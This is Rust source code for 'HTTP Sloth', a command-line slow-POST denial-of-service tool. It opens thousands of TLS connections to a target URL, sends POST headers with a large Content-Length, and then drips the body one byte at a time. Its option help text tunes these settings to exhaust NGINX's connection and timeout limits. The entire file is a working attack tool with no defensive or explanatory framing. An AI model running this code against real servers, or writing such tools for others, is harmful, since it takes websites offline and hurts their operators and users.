use std::convert::TryFrom;
use std::io;
use std::net::ToSocketAddrs;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::thread::sleep;
use std::time::Duration;

extern crate clap;
use clap::{Arg, Command};

#[macro_use]
extern crate log;

use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use tokio::time;

use tokio_rustls::{
    rustls::pki_types::ServerName, rustls::ClientConfig, rustls::RootCertStore, TlsConnector,
};

use url::Url;

#[tokio::main]
async fn main() -> io::Result<()> {
    std::env::set_var("RUST_LOG", "info");
    env_logger::init();

    let arguments = Command::new("HTTP Sloth")
        .arg(Arg::new("url")
             .long("url")
             .value_name("URL")
             .help("Target URL.")
             .required(true))
        .arg(Arg::new("content-length")
             .long("content-length")
             .value_name("BYTES")
             .help("Content-Length request header. Must be less than client_max_body_size (NGINX)"))
        .arg(Arg::new("interval")
             .value_name("SECONDS")
             .long("interval")
             .help("Byte to byte interval. Should be less than server's client_body_timeout (NGINX) value."))
        .arg(Arg::new("max-connections")
             .long("max-connections")
             .value_name("INTEGER")
             .help("Higher cap for simultaneously opened connections. Should be more than server can handle (1024 NGINX default)."))
        .get_matches();

    let parsed_url = Url::parse(arguments.get_one::<String>("url").unwrap()).unwrap();
    let host = parsed_url.host_str().unwrap().to_owned();
    let path = parsed_url.path();
    let content_length = *arguments
        .get_one::<u32>("content-length")
        .unwrap_or(&50_000);
    let tick = Duration::from_secs(*arguments.get_one::<u64>("interval").unwrap_or(&50));
    let max_connections_count: usize = *arguments
        .get_one::<usize>("max-connections")
        .unwrap_or(&32768);
    let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, &host, content_length);
    let addr = format!(
        "{}:{}",
        parsed_url.host_str().unwrap(),
        parsed_url.port_or_known_default().unwrap()
    )
    .to_socket_addrs()
    .unwrap()
    .next()
    .unwrap();

    let mut root_store = RootCertStore::empty();

    root_store.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());

    let config = ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();

    let tls_connector: TlsConnector = Arc::new(config).into();

    let live_connections = Arc::new(AtomicUsize::new(0));

    {
        let mut interval = time::interval(Duration::from_secs(1));
        let live_connections = Arc::clone(&live_connections);
        tokio::spawn(async move {
            loop {
                interval.tick().await;
                info!(
                    "Live Connections: {}",
                    live_connections.load(Ordering::SeqCst)
                );
            }
        });
    }

    loop {
        let live_connections = Arc::clone(&live_connections);
        if live_connections.load(Ordering::SeqCst) >= max_connections_count {
            sleep(Duration::from_secs(1));
            continue;
        }

        let connection_number = live_connections.fetch_add(1, Ordering::SeqCst) + 1;
        let start = start.clone();
        let tls_connector = tls_connector.clone();
        let host = host.clone();

        tokio::spawn(async move {
            let socket = TcpStream::connect(&addr).await.map_err(|e| {
                live_connections.fetch_sub(1, Ordering::SeqCst);
                let message = format!(
                    "ERROR: TcpStream::connect: Connection number: {}: {}",
                    connection_number, e
                );
                debug!("{}", message);
                io::Error::new(io::ErrorKind::Other, message)
            })?;

            let mut connection = tls_connector
                .connect(ServerName::try_from(host).unwrap(), socket)
                .await
                .map_err(|e| {
                    live_connections.fetch_sub(1, Ordering::SeqCst);
                    let message = format!(
                        "ERROR: tokio_tls::TlsConnector.connect: Connection number: {}: {}",
                        connection_number, e
                    );
                    debug!("{}", message);
                    io::Error::new(io::ErrorKind::Other, message)
                })?;
            // Write start
            AsyncWriteExt::write_all(&mut connection, start.as_bytes())
                .await
                .map_err(|e| {
                    live_connections.fetch_sub(1, Ordering::SeqCst);
                    let message = format!(
                        "ERROR: Start write_all await: Connection number: {}: {}",
                        connection_number, e
                    );
                    debug!("{}", message);
                    io::Error::new(io::ErrorKind::Other, message)
                })?;
            let mut interval = time::interval(tick);
            tokio::spawn(async move {
                interval.tick().await;
                // Write a byte into a body
                AsyncWriteExt::write_u8(&mut connection, 1u8)
                    .await
                    .map_err(|e| {
                        live_connections.fetch_sub(1, Ordering::SeqCst);
                        let message = format!(
                            "ERROR: Body write await: Connection number: {}: {}",
                            connection_number, e
                        );
                        debug!("{}", message);
                        io::Error::new(io::ErrorKind::Other, message)
                    })?;
                Ok::<(), io::Error>(())
            });
            Ok::<(), io::Error>(())
        });
    }
}
